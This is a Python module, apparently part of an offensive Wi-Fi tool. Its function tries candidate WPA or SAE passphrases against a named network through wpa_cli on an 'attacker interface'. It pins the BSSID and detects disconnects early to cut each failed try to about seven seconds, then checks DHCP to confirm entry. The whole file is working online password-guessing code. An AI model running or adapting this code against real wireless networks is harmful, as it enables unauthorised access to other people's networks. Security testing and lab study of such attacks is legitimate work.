"""psk.py - managed-mode WPA passphrase attempts on the attacker interface.

One association at a time (single-PHY constraint). BSSID pinning + fail-fast
disconnect detection keep a failed try near ~7s (measured 14s unpinned).
"""
import re
import time
from .. import config
from ..radio import wpa_cli, run


def quote(s):
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'


def key_mgmt_for(flags):
    f = flags or ""
    if "SAE" in f and "PSK" not in f:
        return "SAE"
    return "WPA-PSK"


def attempt(ssid, password, key_mgmt="WPA-PSK", wait_s=None,
            bssid=None, freq=None, dhcp=True,
            ctrl=config.CTRL_DIR, iface=config.IFACE):
    """Try one credential. Returns (ok, info). Never touches wlan0."""
    wait_s = config.TRY_WAIT_S if wait_s is None else wait_s
    _, out = wpa_cli(ctrl, iface, "add_network")
    nid = out.strip().splitlines()[-1].strip() if out.strip() else None
    if not nid or not nid.isdigit():
        return False, f"add_network failed: {out}"
    wpa_cli(ctrl, iface, "set_network", nid, "ssid", quote(ssid))
    if bssid:
        wpa_cli(ctrl, iface, "set_network", nid, "bssid", bssid)
    if freq:
        wpa_cli(ctrl, iface, "set_network", nid, "scan_freq", freq)
    if key_mgmt == "NONE":
        wpa_cli(ctrl, iface, "set_network", nid, "key_mgmt", "NONE")
    else:
        wpa_cli(ctrl, iface, "set_network", nid, "psk", quote(password))
        wpa_cli(ctrl, iface, "set_network", nid, "key_mgmt", key_mgmt)
    wpa_cli(ctrl, iface, "enable_network", nid)
    wpa_cli(ctrl, iface, "select_network", nid)
    ok, state = False, ""
    deadline = time.time() + wait_s
    while time.time() < deadline:
        time.sleep(1.0)
        _, st = wpa_cli(ctrl, iface, "status")
        m = re.search(r"wpa_state=(\S+)", st)
        state = m.group(1) if m else ""
        if state == "COMPLETED":
            ok = True
            break
        if state in ("INACTIVE", "DISCONNECTED"):
            break  # definitive reject, don't burn remaining budget
    ip = ""
    if ok and dhcp:
        run(["dhcpcd", "--timeout", str(config.DHCP_TIMEOUT_S), iface], timeout=20)
        time.sleep(2)
        _, ipout = run(["ip", "-4", "-o", "addr", "show", iface], 10)
        m = re.search(r"inet (\S+)", ipout)
        ip = m.group(1) if m else ""
        if not ip:
            ok = False  # associated but no DHCP: not a scoring success
    wpa_cli(ctrl, iface, "remove_network", nid)
    if not ok:
        run(["dhcpcd", "-k", iface], timeout=10)
    return ok, f"state={state} ip={ip}"
